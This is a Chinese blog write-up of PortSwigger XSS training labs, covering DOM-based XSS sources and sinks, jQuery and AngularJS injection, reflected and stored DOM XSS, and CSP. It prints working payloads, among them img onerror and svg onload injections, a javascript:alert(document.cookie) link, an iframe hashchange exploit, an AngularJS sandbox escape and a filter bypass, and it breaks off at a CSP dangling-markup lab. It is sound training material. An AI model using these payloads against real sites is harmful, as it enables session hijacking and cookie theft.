# 原创
：  【burpsuite安全练兵场-客户端11】跨站点脚本XSS-10个实验（下）

# 【burpsuite安全练兵场-客户端11】跨站点脚本XSS-10个实验（下）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书，华为云、阿里云、51CTO优质博主等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）利用不同的源和汇开发DOM XSS（√）
（2）第三方依赖项中的源和汇（√）
（3）DOM XSS结合反射和存储数据（√）
（4）会导致DOM-XSS漏洞的接收器（√）
（5）CSP内容安全策略（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、存储的XSS](#%E4%B8%80%E3%80%81%E5%AD%98%E5%82%A8%E7%9A%84XSS)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[二、基于DOM的XSS](#%E4%BA%8C%E3%80%81%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[二、利用不同的源和汇开发DOM XSS](#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%BA%90%E5%92%8C%E6%B1%87%E5%BC%80%E5%8F%91DOM%20XSS)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ADOM%20XSS%E8%BE%93%E5%85%A5%20document.write%20%E6%B1%87%E4%BD%BF%E7%94%A8%E6%BA%90%20location.search)[实验3：DOM XSS输入 document.write 汇使用源 location.search](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ADOM%20XSS%E8%BE%93%E5%85%A5%20document.write%20%E6%B1%87%E4%BD%BF%E7%94%A8%E6%BA%90%20location.search)

[        ](#%E5%AE%9E%E9%AA%8C10%EF%BC%9ADOM%20XSS%E8%BE%93%E5%85%A5%20document.write%20%E6%B1%87%E4%BD%BF%E7%94%A8%E6%BA%90%20location.search%20%E5%9C%A8%E9%80%89%E6%8B%A9%E5%85%83%E7%B4%A0%E5%86%85)[实验10：DOM XSS输入 document.write 汇使用源 location.search 在选择元素内](#%E5%AE%9E%E9%AA%8C10%EF%BC%9ADOM%20XSS%E8%BE%93%E5%85%A5%20document.write%20%E6%B1%87%E4%BD%BF%E7%94%A8%E6%BA%90%20location.search%20%E5%9C%A8%E9%80%89%E6%8B%A9%E5%85%83%E7%B4%A0%E5%86%85)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9ADOM%20XSS%E8%BE%93%E5%85%A5%20innerHTML%20%E6%B1%87%E4%BD%BF%E7%94%A8%E6%BA%90%20location.search)[实验4：DOM XSS输入 innerHTML 汇使用源 location.search](#%E5%AE%9E%E9%AA%8C4%EF%BC%9ADOM%20XSS%E8%BE%93%E5%85%A5%20innerHTML%20%E6%B1%87%E4%BD%BF%E7%94%A8%E6%BA%90%20location.search)

[2、第三方依赖项中的源和汇](#2%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BE%9D%E8%B5%96%E9%A1%B9%E4%B8%AD%E7%9A%84%E6%BA%90%E5%92%8C%E6%B1%87)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9AjQuery%E9%94%9A%E4%B8%AD%E7%9A%84DOM%20XSS%20href%20%E5%B1%9E%E6%80%A7%E6%8E%A5%E6%94%B6%E5%99%A8%E4%BD%BF%E7%94%A8%20location.search%20%E6%BA%90)[实验5：jQuery锚中的DOM XSS href 属性接收器使用 location.search 源](#%E5%AE%9E%E9%AA%8C5%EF%BC%9AjQuery%E9%94%9A%E4%B8%AD%E7%9A%84DOM%20XSS%20href%20%E5%B1%9E%E6%80%A7%E6%8E%A5%E6%94%B6%E5%99%A8%E4%BD%BF%E7%94%A8%20location.search%20%E6%BA%90)

[        ](#%E5%AE%9E%E9%AA%8C6%EF%BC%9AjQuery%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8hashchange%E4%BA%8B%E4%BB%B6%E7%9A%84DOM%20XSS)[实验6：jQuery选择器接收器中使用hashchange事件的DOM XSS](#%E5%AE%9E%E9%AA%8C6%EF%BC%9AjQuery%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8hashchange%E4%BA%8B%E4%BB%B6%E7%9A%84DOM%20XSS)

[        ](#%E5%AE%9E%E9%AA%8C11%EF%BC%9A%E5%B8%A6%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84DOM%20XSS%20HTML%E7%BC%96%E7%A0%81)[实验11：带尖括号和双引号的AngularJS表达式中的DOM XSS HTML编码](#%E5%AE%9E%E9%AA%8C11%EF%BC%9A%E5%B8%A6%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E7%9A%84DOM%20XSS%20HTML%E7%BC%96%E7%A0%81)

[3、DOM XSS结合反射和存储数据](#3%E3%80%81DOM%20XSS%E7%BB%93%E5%90%88%E5%8F%8D%E5%B0%84%E5%92%8C%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE)

[        ](#%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E5%8F%8D%E5%B0%84DOM%20XSS)[实验12：反射DOM XSS](#%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E5%8F%8D%E5%B0%84DOM%20XSS)

[        ](#%E5%AE%9E%E9%AA%8C13%EF%BC%9A%E5%AD%98%E5%82%A8DOM%20XSS)[实验13：存储DOM XSS](#%E5%AE%9E%E9%AA%8C13%EF%BC%9A%E5%AD%98%E5%82%A8DOM%20XSS)

[ 3、会导致DOM-XSS漏洞的接收器](#%C2%A03%E3%80%81%E4%BC%9A%E5%AF%BC%E8%87%B4DOM-XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8E%A5%E6%94%B6%E5%99%A8)

[三、CSP内容安全策略](#%E4%B8%89%E3%80%81CSP%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[ 2、使用CSP减轻XSS攻击](#%C2%A02%E3%80%81%E4%BD%BF%E7%94%A8CSP%E5%87%8F%E8%BD%BBXSS%E6%94%BB%E5%87%BB)

[        ](#%E5%AE%9E%E9%AA%8C29%EF%BC%9A%E5%8F%8D%E5%B0%84%E7%9A%84XSS%E5%8F%97%E9%9D%9E%E5%B8%B8%E4%B8%A5%E6%A0%BC%E7%9A%84CSP%E4%BF%9D%E6%8A%A4%EF%BC%8C%E5%B8%A6%E6%9C%89%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB)[实验29：反射的XSS受非常严格的CSP保护，带有悬空标记攻击](#%E5%AE%9E%E9%AA%8C29%EF%BC%9A%E5%8F%8D%E5%B0%84%E7%9A%84XSS%E5%8F%97%E9%9D%9E%E5%B8%B8%E4%B8%A5%E6%A0%BC%E7%9A%84CSP%E4%BF%9D%E6%8A%A4%EF%BC%8C%E5%B8%A6%E6%9C%89%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB)

[3、使用CSP减轻悬空标记攻击](#3%E3%80%81%E4%BD%BF%E7%94%A8CSP%E5%87%8F%E8%BD%BB%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB)

[4、使用策略注入绕过CSP](#4%E3%80%81%E4%BD%BF%E7%94%A8%E7%AD%96%E7%95%A5%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87CSP)

[        ](#%E5%AE%9E%E9%AA%8C30%EF%BC%9A%E5%8F%8D%E5%B0%84XSS%E5%8F%97CSP%E4%BF%9D%E6%8A%A4%EF%BC%8C%E5%B8%A6CSP%E6%97%81%E8%B7%AF)[实验30：反射XSS受CSP保护，带CSP旁路](#%E5%AE%9E%E9%AA%8C30%EF%BC%9A%E5%8F%8D%E5%B0%84XSS%E5%8F%97CSP%E4%BF%9D%E6%8A%A4%EF%BC%8C%E5%B8%A6CSP%E6%97%81%E8%B7%AF)

---


> 
 上文：
[【BP靶场portswigger-客户端11】跨站点脚本XSS-20个实验（上）<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.1/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=MBR7"/>https://blog.csdn.net/qq_53079406/article/details/128649361](https://blog.csdn.net/qq_53079406/article/details/128649361)


## 一、存储的XSS

> 
<h3>1、简述：</h3>
存储的跨站点脚本（也称为二阶或持久性XSS）出现在应用程序从不受信任的源接收数据并以不安全的方式将该数据包含在其随后的HTTP响应中时
<pre><code>1、示例：网站允许用户提交对博客文章的评论，这些评论将显示给其他用户。用户使用HTTP请求提交注释，如下：
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&amp;comment=This+post+was+extremely+helpful.&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net

2、提交此评论后，访问该博客帖子的任何用户都将在应用程序的响应中收到以下内容：
&lt;p&gt;This post was extremely helpful.&lt;/p&gt;

3、假设应用程序不对数据执行任何其他处理，攻击者可以提交如下恶意评论：
&lt;script&gt;/* Bad stuff here... */&lt;/script&gt;

4、在攻击者的请求中，此注释将被URL编码为：
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E

5、访问博客帖子的任何用户都将在应用程序的响应中收到以下内容：
&lt;p&gt;&lt;script&gt;/* Bad stuff here... */&lt;/script&gt;&lt;/p&gt;

6、攻击者提供的脚本将在受害用户的浏览器中执行，该浏览器位于受害用户与应用程序会话的上下文中。 </code></pre>
涉及实验：
反射XSS、存储XSS在上文中都已解决
[【BP靶场portswigger-客户端11】跨站点脚本XSS-20个实验（上）【BP靶场portswigger-客户端11-跨站点脚本XSS】19个实验-万文详细步骤<img alt="" src="https://g.csdnimg.cn/static/logo/favicon32.ico"/>https://blog.csdn.net/qq_53079406/article/details/128649361](https://blog.csdn.net/qq_53079406/article/details/128649361)


---


---


## 二、基于DOM的XSS

> 
<h3>1、简述：</h3>
1、当JavaScript从攻击者可控制的源（如URL）获取数据并将其传递到支持动态代码执行的接收器，如 eval() 或 innerHTML。这使得攻击者能够执行恶意JavaScript，能劫持其他用户的帐户
<hr/>
2、要进行基于DOM的XSS攻击，需要将数据放入源中，以便将其传播到接收器并导致执行任意JavaScript
<hr/>
3、DOM XSS最常见的源是URL，通常使用 window.location对象。攻击者可以构建一个链接，通过URL的查询字符串和片段部分中的有效负载将受害者发送到易受攻击的页面。在某些情况下，例如当目标是404页面或运行PHP的网站时，也可以将有效负载放置在路径中。
<hr/>
4、测试
大多数DOM XSS漏洞可以使用Burp Suite的 Web漏洞扫描程序。要手动测试基于DOM的跨站点脚本，通常需要使用带有开发人员工具的浏览器，如Chrome。需要依次处理每个可用的源，并单独测试每个源
<hr/>
5、测试HTML接收器
（1）若要在HTML接收器中测试DOMXSS，将随机字母数字字符串放入源（如 location.search ），然后使用开发人员工具检查HTML并找到字符串出现的位置。浏览器的"View source"选项不适用于DOM XSS测试，因为它没有考虑JavaScript在HTML中执行的更改。在Chrome的开发者工具中，您可以使用 `Control+F` （或 `Command+F`在MacOS上）在DOM中搜索字符串
（2）对于字符串出现在DOM中的每个位置，都需要标识上下文。基于这个上下文，需要细化输入以查看它是如何处理的。如字符串出现在双引号属性中，则尝试在字符串中插入双引号，以查看是否可以跳出该属性
（3）浏览器在URL编码方面的行为不同，Chrome、Firefox和Safari将对location.search和location.hash进行URL编码，而IE11和Microsoft Edge（Chromium之前）不会对这些源进行URL编码。如果数据在处理之前进行了URL编码，那么XSS攻击就不太可能起作用 
<hr/>
6、测试JavaScript执行接收器
（1）测试基于DOM的XSS的JavaScript执行接收器有点困难。有了这些接收器，输入不一定出现在DOM中的任何地方，因此无法搜索它，而是需要使用JavaScript调试器来确定是否以及如何将输入发送到接收器
（2）对于每个潜在的源（例如`location`），首先需要在页面的JavaScript代码中查找引用源的实例。在Chrome的开发者工具中，可以使用Control+Shift+F（或Mac OS上的Command+Alt+F）来搜索页面的所有JavaScript代码以查找源代码。
（3）找到读取源代码的位置，就可以使用JavaScript调试器添加断点，并跟踪源代码值的使用方式。可能会发现源被赋给了其他变量。如果是这种情况，需要再次使用搜索函数来跟踪这些变量，并查看它们是否被传递到接收器。当发现接收器被分配了源自源的数据时，可以使用调试器检查值，方法是将鼠标悬停在变量上以显示其值，然后再将其发送到接收器。然后与HTML接收器一样，需要改进输入，看看是否能够成功地进行XSS攻击。 
<hr/>
7、使用DOM Invader测试DOM XSS
在识别和利用DOMXSS可能是一个乏味的过程，通常需要手动浏览复杂的、小型化的JavaScript。但如果使用Burp的web vulnerability scanner，则可以利用其内置的DOM Invader扩展，完成许多繁重的工作


---


---


---


---


---


## 二、利用不同的源和汇开发DOM XSS

> 
<h3>1、简述：</h3>
1、如果存在可执行路径，数据可以通过该路径从源传播到接收器，则网站容易受到基于DOM的跨站点脚本攻击。在实践中，不同的源和汇具有不同的属性和行为，这些属性和行为会影响可利用性，并决定需要哪些技术。此外，网站的脚本可能会执行验证或其他数据处理，在尝试利用漏洞时必须适应这些处理。与基于DOM的漏洞相关的漏洞有很多。
<pre><code>document .write 接收器与脚本元素一起工作，因此可以使用简单的有效负载，如下所示：
document.write('... &lt;script&gt;alert(document.domain)&lt;/script&gt; ...');</code></pre>
在某些情况下，写入document.write的内容包含一些需要在利用漏洞时考虑的周围环境。如在使用JavaScript有效负载之前，可能需要关闭一些现有元素。
————
涉及实验：
实验3：DOM XSS输入 document.write 汇使用源 location.search
实验10：DOM XSS输入 document.write 汇使用源 location.search 在选择元素内
<hr/>
2、 该 innerHTML 接收器不接受 script 元素，也不会 svg onload事件触发。这意味着将需要使用替代元素，如img 或 iframe。事件处理程序，如onload 以及onerror可以与这些元件结合使用。例如：<br/> element.innerHTML='... &lt;img src=1 οnerrοr=alert(document.domain)&gt; ...'
————
涉及实验：
实验4：DOM XSS输入 innerHTML 汇使用源 location.search


> 
<h3>实验3：DOM XSS输入 document.write 汇使用源 location.search</h3>
信息：
本实验在搜索查询跟踪功能中包含一个基于DOM的跨站点脚本漏洞。它使用JavaScript document.write函数，该函数将数据写入页面。document.write函数是使用www.example.com中的数据调用location.search，可以使用网站URL来控制这些数据
要完成本实验，请执行调用警报函数的跨站点脚本攻击。
<hr/>
part1:
在搜索框中输入随机字母数字字符串，右键单击并检查元素


观察随机字符串是否已放置在img src属性中


通过插入以下内容突破img属性：
<pre>`"&gt;&lt;svg onload=alert(1)&gt;`</pre>

 完成实验




> 
<h3>实验10：DOM XSS输入 document.write 汇使用源 location.search 在选择元素内</h3>
信息：
本实验包含股票检查器功能中基于DOM的跨站点脚本漏洞。使用JavaScript document.write函数，该函数将数据写入页面。document.write函数是使用www.example.com中的数据调用的，可以使用网站URL控制这些数据。location.search 可以通过网站来控制 URL.数据包含在select元素中。
完成实验：执行跨站点脚本攻击，该攻击会突破select元素并调用alert函数。
<hr/>
part1:
在产品页面上，注意危险的JavaScript从www.example.com源代码中提取storeId参数location.search。它使用document.write在select元素中为checker stock 功能创建一个新选项。
将storeId查询参数添加到URL，并输入随机字母数字字符串作为其值。请求此修改后的URL。
<img alt="" height="954" src="https://img-blog.csdnimg.cn/3a8646d60b114be58de45072c52a0bf6.png" width="1200"/><br/> 在浏览器中，随机字符串现在作为选项之一列在下拉列表中，且作为storeId参数的值已放置在select元素中


<hr/>
part2：
插入XSS 
更改URL以在storeId参数中包含合适的XSS有效负载，如下所示：
<pre><code>product?productId=1&amp;storeId="&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;

也就是添加：
"&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;</code></pre>

完成实验




---


> 
<h3>实验4：DOM XSS输入 innerHTML 汇使用源 location.search</h3>
信息：
本实验在搜索博客功能中包含一个基于DOM的跨站点脚本漏洞。使用一个innerHTML赋值，该赋值使用location.search中的数据更改div元素的HTML内容。
完成实验：执行调用alert函数的跨站点脚本攻击。
<hr/>
part1：
在搜索框中输入以下内容，单击"搜索"
<pre><code>payload：
&lt;img src=1 onerror=alert(1)&gt;

原理：
src属性的值无效并引发错误。这将触发onerror事件处理程序，然后该处理程序调用alert()函数。因此只要用户的浏览器尝试加载包含恶意帖子的页面，就会执行有效负载</code></pre>




> 
<h3>2、第三方依赖项中的源和汇</h3>
1、现代的web应用程序通常使用许多第三方库和框架来构建，这些库和框架通常为开发者提供附加的功能和能力。重要的是要记住，其中一些也是DOMXSS的潜在源和汇。
<hr/>
2、jQuery中的DOM XSS
如果正在使用jQuery之类的JavaScript库，可能改变页面上DOM元素的接收器。如jQuery的attr()函数可以更改DOM元素的属性。如果数据是从用户控制的源（如URL）读取的，然后传递给attr()函数，那么就有可能操纵发送的值以导致XSS。如有一些JavaScript，它使用来自URL的数据更改锚元素的href属性： 
<pre><code>$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});</code></pre>
可以通过修改URL来利用此漏洞，以便location.search源包含恶意JavaScript URL。在页面的JavaScript将此恶意URL应用到返回链接的href，点击返回链接将执行它： 
<pre>`?returnUrl=javascript:alert(document.domain)`</pre>
涉及实验：
实验5：jQuery锚中的DOM XSS href 属性接收器使用 location.search 源
————
3、另一个需要注意的潜在接收器是jQuery的$()选择器函数，它可用于将恶意对象注入DOM。
<pre><code>jQuery曾经非常流行，典型的DOM XSS漏洞是由于网站将此选择器与location.hash源结合使用来生成动画或自动滚动到页面上的特定元素而导致的。此行为通常是使用易受攻击的hashchange事件处理程序实现的，如下所示：
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});</code></pre>
作为 hash 是用户可控的，攻击者可以利用它将XSS向量注入 $()选择器接收器。较新版本的jQuery修补了此特定漏洞，方法是在输入以散列字符（ #）。但仍然可以在野外找到易受攻击的代码
<pre><code>要真正利用此典型漏洞，需要找到一种方法来触发hashchange没有用户交互的事件。最简单的方法之一是通过iframe：
&lt;iframe src="https://vulnerable-website.com#" onload="this.src+='&lt;img src=1 onerror=alert(1)&gt;'"&gt;</code></pre>
在此示例中，src属性指向哈希值为空的易受攻击的页面。当 iframe 被加载时，一个XSS向量被附加到散列中，从而触发hashchange事件（即使较新版本的jQuery也可能通过 $() 选择器接收器，前提是可以完全控制来自不需要 #前缀）<br/> ————
涉及实验：<br/> 实验6：jQuery选择器接收器中使用hashchange事件的DOM XSS
<hr/>
4、DOM XSS输入 角度JS
如果使用AngularJS这样的框架，就有可能在没有尖括号或事件的情况下执行JavaScript。当站点使用 新应用程序属性，将由AngularJS处理。在这种情况下，AngularJS将执行双花括号内的JavaScript，这可以直接出现在HTML中或属性内
————
涉及实验：
实验11：带尖括号和双引号的AngularJS表达式中的DOM XSS HTML编码


---


> 
<h3>实验5：jQuery锚中的DOM XSS href 属性接收器使用 location.search 源</h3>
信息：
本实验在提交反馈页中包含一个基于DOM的跨站点脚本漏洞，使用jQuery库的$selector函数查找锚元素，并使用location.search中的数据更改其href属性
解决实验：将“返回”链接设置为alert document. cookie
<hr/>
part1：
在Submit feedback页面上，此时的URL参数为returnPath/

 将/后添加随机字母数字字符串


右键单击并检查该元素，观察到随机字符串已被放置在a href属性中

<hr/>
 part2：
payload插入
将返回路径更改如下
<pre>`javascript:alert(document.cookie)`</pre>




---


> 
<h3>实验6：jQuery选择器接收器中使用hashchange事件的DOM XSS</h3>
信息：
本实验的主页上存在一个基于DOM的跨站点脚本漏洞。它使用jQuery的$()选择器函数自动滚动到给定的帖子，其标题通过location.hash属性传递。
解决实验：向受害者发送一个利用漏洞攻击，在其浏览器中调用print()函数
<hr/>
part1：
请注意主页上使用Burp或浏览器的DevTools的易受攻击的代码。<br/> 从实验标题中，打开利用漏洞攻击服务器
在正文部分中，添加以下恶意iframe：
<pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;

我的是：
&lt;iframe src="https://0af900b803abb66cc0ec1d4400820051.web-security-academy.net/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;</code></pre>



存储利用漏洞攻击，然后单击View exploit（查看利用漏洞攻击）以确认调用了print()函数
<img alt="" height="956" src="https://img-blog.csdnimg.cn/d338b64f54744418aa2df973d29b2212.png" width="1200"/><br/> 返回漏洞攻击服务器，然后单击Deliver to victim（发送给受害者）
完成实验



> 
<h3>实验11：带尖括号和双引号的AngularJS表达式中的DOM XSS HTML编码</h3>
信息：
本实验在搜索功能的AngularJS表达式中包含一个基于DOM的跨站点脚本漏洞。
AngularJS是一个流行的JavaScript库，它扫描包含ng-app属性（也称为AngularJS指令）的HTML节点的内容。将指令添加到HTML代码中后，可以在双大括号内执行JavaScript表达式。此技术在编码尖括号时很有用。
完成实验：执行跨站点脚本攻击，该攻击执行AngularJS表达式并调用alert函数。
<hr/>
part1：
在搜索框中输入随机字母数字字符串
<img alt="" height="688" src="https://img-blog.csdnimg.cn/d6a96f2dd2d0485da65fac5db39210fa.png" width="1200"/><br/> 查看页面源代码，发现随机字符串包含在ng-app指令中
 <img alt="" height="953" src="https://img-blog.csdnimg.cn/9f9138e7ff53489aa6213dae60816847.png" width="1200"/>
<hr/>
part2： 
插入XSS
在搜索框中输入以下AngularJS表达式：
<pre>`{{$on.constructor('alert(1)')()}}`</pre>

<img alt="" height="863" src="https://img-blog.csdnimg.cn/64b94057096a4a898517dedc336ca365.png" width="1200"/> 完成实验



---


> 
<h3>3、DOM XSS结合反射和存储数据</h3>
1、一些纯粹基于DOM的漏洞是独立于单个页面的。如果脚本从URL读取一些数据并将其写入危险的接收器，则漏洞完全是客户端的。
<hr/>
2、来源并不局限于浏览器直接暴露的数据，也可以来自网站。如网站经常在来自服务器的HTML响应中反映URL参数。这通常与普通XSS有关，但也可能导致反射DOM XSS漏洞。
<hr/>
3、在反射的DOM XSS漏洞中，服务器处理来自请求的数据，并将数据回显到响应中。反射的数据可以放在JavaScript字符串文字中，或者DOM中的数据项（如表单字段）中。然后，页上的脚本以不安全的方式处理反射的数据，最终将其写入危险的接收器。
<pre>`eval('var data = "reflected string"');`</pre>
涉及实验：
实验12：反射DOM XSS
<hr/>
4、网站也可能将数据存储在服务器上并将其反映到其他地方。在存储的DOM XSS漏洞中，服务器从一个请求接收数据，存储它，然后将数据包含在以后的响应中。稍后响应中的脚本包含一个接收器，该接收器以不安全的方式处理数据。 
<pre>`element.innerHTML = comment.author`</pre>
涉及实验：
实验13：存储DOM XSS


---


> 
<h3>实验12：反射DOM XSS</h3>
信息：
本实验演示了一个反射DOM漏洞。当服务器端应用程序处理来自请求的数据并在响应中回显数据时，会出现反射DOM漏洞。然后，页上的脚本以不安全的方式处理反射的数据，最终将其写入危险的接收器。
完成实验：创建一个调用alert()函数的注入
<hr/>
part1：
在Burp Suite中，转到代理工具并确保拦截功能已打开。<br/> 使用搜索栏搜索随机测试字符串<br/> 在Intercept选项卡上，注意字符串反映在名为search-results的JSON响应中
<img alt="" height="936" src="https://img-blog.csdnimg.cn/aa340ed65ba84a6a9c5fbee43e762bdb.png" width="1200"/><br/> 在站点地图中，打开searchResults.js文件，注意JSON响应与eval()函数调用一起使用。<br/> 发送到repeater，通过试验不同的搜索字符串，可以识别JSON响应正在转义引号。但反斜杠不会转义


<hr/>
part2:
插入xss
<pre><code>payload:
\"-alert(1)}//</code></pre>
原理：
1、由于已经插入了一个反斜杠，并且站点没有对它们进行转义，因此当JSON响应试图转义开头的双引号字符时，它会添加第二个反斜杠。产生的双反斜杠将导致转义被有效地取消。这意味着处理双引号时不转义，这将结束应包含搜索项的字符串。
2、然后，在调用alert（）函数之前，使用算术运算符（本例中为减法运算符）分隔表达式。最后，一个右花括号和两个正斜杠提前关闭JSON对象，并注释掉对象的其余部分。


<pre><code>结果，响应生成如下：
{"searchTerm":"\\"-alert(1)}//", "results":[]}</code></pre>



---


> 
<h3>实验13：存储DOM XSS</h3>
信息：
本实验演示了博客评论功能中的存储DOM漏洞
完成实验：利用此漏洞调用alert()函数
<hr/>
part1：
发表包含以下向量的评论：
<pre>`&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;`</pre>

然后点击返回博客，移动的时候就弹窗了

 <img alt="" height="948" src="https://img-blog.csdnimg.cn/a7c1a9923a4348eeb1de45e10974b5b8.png" width="1200"/>
 为了防止XSS，网站使用JavaScript replace（）函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数只替换第一个匹配项。我们只需在注释的开头包含一组额外的尖括号，就可以利用此漏洞。这些尖括号将被编码，但任何后续的尖括号将不受影响，使我们能够有效地绕过过滤器并注入HTML。


> 
<h3> 3、会导致DOM-XSS漏洞的接收器</h3>
1、可能导致DOM-XSS漏洞的一些主要接收器：
<pre><code>document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent</code></pre>

<hr/>
2、jQuery函数也是可导致DOM-XSS漏洞的接收器：
<pre><code>add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()</code></pre>


---


---


## 三、CSP内容安全策略

> 
<h3>1、简述：</h3>
1、CSP是一种浏览器安全机制，旨在减轻XSS和其他一些攻击。它的工作原理是限制页面可以加载的资源（如脚本和图像），并限制页面是否可以被其他页面框住。
<hr/>
2、要启用CSP，响应需要包含名为 （Content-Security-Policy）内容安全策略具有包含策略的值。策略本身由一个或多个指令组成，指令之间用分号分隔。 


> 
<h3> 2、使用CSP减轻XSS攻击</h3>
<pre><code>1、以下指令将只允许从同源作为页面本身： 
script-src 'self'

2、以下指令将只允许从特定域加载脚本： 
script-src https://scripts.normal-website.com</code></pre>
1、允许来自外部域的脚本时应谨慎。如果攻击者有任何方法可以控制从外部域提供的内容，那么就有可能发起攻击。如不使用每个客户URL的内容交付网络（CDN）（如ajax.googleapis.com）不应被信任，因为第三方可以将内容放到其域中。
<hr/>
2、除了将特定域列入白名单之外，内容安全策略还提供了另外两种指定受信任资源的方法：随机数和散列：
<pre><code>    1、CSP指令可以指定nonce（随机值），加载脚本的标记中必须使用相同的值。如果这些值不匹配，则脚本不会执行。为了有效地作为一个控件，nonce必须在每次页面加载时安全地生成，并且不能被攻击者猜到。
    2、CSP指令可以指定受信任脚本内容的哈希值。如果实际脚本的哈希与指令中指定的值不匹配，则脚本将不会执行。如果脚本的内容发生变化，那么您当然需要更新在指令中指定的哈希值。</code></pre>
<hr/>
3、CSP阻塞像脚本这样的资源是很常见的。但许多CSP确实允许映像请求。这意味着可以经常使用img元素向外部服务器发出请求，例如为了公开CSRF令牌。
<hr/>
4、一些浏览器，如Chrome，有内置的悬空标记缓解，将阻止包含某些字符的请求，如原始的，未编码的新行或尖括号。
<hr/>
5、有些策略的限制性更强，可以阻止所有形式的外部请求。但通过引发一些用户交互来绕过这些限制仍然是可能的。要绕过这种形式的策略，需要注入一个HTML元素，当单击该元素时，它将存储并向外部服务器发送由注入的元素包含的所有内容。 <br/>  
<hr/>
6、涉及实验：<br/> 实验29：反射的XSS受非常严格的CSP保护，带有悬空标记攻击


---


---


> 
<h3>实验29：反射的XSS受非常严格的CSP保护，带有悬空标记攻击</h3>
信息：
1、本实验使用一个严格的CSP来阻止对外部网站发出的请求。
2、解决实验：使用Burp Collaborator执行跨站点脚本攻击，绕过CSP并泄漏模拟受害用户的CSRF令牌。然后需要将模拟用户的电子邮件地址更改为hacker@evil-user.net。
